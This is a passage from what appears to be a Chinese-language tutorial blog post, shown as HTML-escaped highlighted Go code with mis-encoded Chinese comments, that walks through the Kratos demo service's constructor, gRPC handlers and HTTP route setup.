&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;dao&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Dao&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// New new a service and return.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;dao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Dao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cf&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// åˆå§‹åŒ–ï½ï½ï½
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;paladin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;TOML&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{},&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;dao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;// ä¸€ä¸ªå…³é—­çš„é’©å­
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;cf&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Close&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;// çƒ­åŠ è½½ application.toml é…ç½®æ–‡ä»¶
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;// åŸç†æ˜¯ä½¿ç”¨fsnotifyç›‘å¬æ–‡ä»¶å˜æ›´
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;paladin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Watch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;application.toml&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ac&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// -------------- ä¸‹é¢éƒ½æ˜¯ä½ çš„gRPCä¸šåŠ¡é€»è¾‘-------------
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;// SayHello grpc demo func.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;SayHello&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HelloReq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;reply&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;reply&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hello %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// SayHelloURL bm demo func.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;SayHelloURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HelloReq&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;reply&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HelloResp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;reply&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;HelloResp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;Content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;hello &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hello url %s&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// Ping ping the resource.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Ping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{},&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;dao&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Ping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// Close close the resource.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Service&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å“‡å“¦ï¼Œç°åœ¨æˆ‘ä»¬çŸ¥é“äº†ï¼Œ&lt;code&gt;Service&lt;/code&gt;æ˜¯ç”±ä¸€äº›&lt;code&gt;gRPC&lt;/code&gt;æ–¹æ³•ï¼Œé…ç½®é¡¹ï¼Œæ¨¡å‹å±‚ç»„æˆçš„ã€‚&lt;/p&gt;
&lt;p&gt;å¥½ï¼Œä¹˜èƒœè¿½å‡»æˆ‘ä»¬å†çœ‹ä¸€çœ‹&lt;code&gt;engine, err := http.New(serviceService)&lt;/code&gt;åšäº†ä»€ä¹ˆã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DemoServer&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// New new a bm server.
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DemoServer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;engine&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Engine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;cfg&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ServerConfig&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;ct&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;paladin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;TOML&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;// è¯»å–ä½ çš„é…ç½®æ–‡ä»¶
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;paladin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http.toml&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Unmarshal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;c1&#34;&gt;// å¾—åˆ°http.tomlçš„Serverå­—æ®µ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Server&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;UnmarshalTOML&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;// åšä¸€ä¸ªæ–° engine 
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;// (engine æ˜¯ Gin é‡Œçš„æ¨¡å—ï¼Œè¿™é‡Œæˆ‘å°±ä¸åˆ†æGinçš„æºç äº†)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;engine&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;DefaultServer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;// å°†gRPCæœåŠ¡æ³¨å†Œåˆ°engine, è¿™ä¸ªä»£ç æ³¨å†Œä»£ç æ˜¯bmè‡ªå·±ç”Ÿæˆçš„
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;// ä¸€ä¼šæˆ‘ä»¬åˆ†æ
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;pb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;RegisterDemoBMServer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;engine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;// æŠŠä½ çš„è·¯ç”±æè¿›å»
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nf&#34;&gt;initRouter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;engine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

	&lt;span class=&#34;c1&#34;&gt;// å¼€å§‹è·‘
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;engine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// è·¯ç”±åœ¨è¿™é‡Œç™»è®°ï¼
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;initRouter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Engine&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Ping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;g&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Group&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/kratos-demo&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
		&lt;span class=&#34;nx&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/start&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;howToStart&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ping&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ctx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
